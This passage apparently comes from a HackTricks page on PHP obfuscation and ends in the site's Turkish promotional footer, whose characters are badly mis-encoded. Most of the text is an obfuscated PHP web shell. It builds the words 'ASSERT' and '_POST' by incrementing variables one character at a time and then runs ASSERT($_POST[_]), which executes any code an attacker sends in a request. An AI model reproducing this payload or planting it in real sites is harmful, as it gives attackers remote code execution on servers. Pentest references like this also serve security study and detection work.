$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<figure><img src="../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmaya kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da takip edin.**
* **Hacking hilelerinizi paylaÅŸarak PR'ler gÃ¶ndererek HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
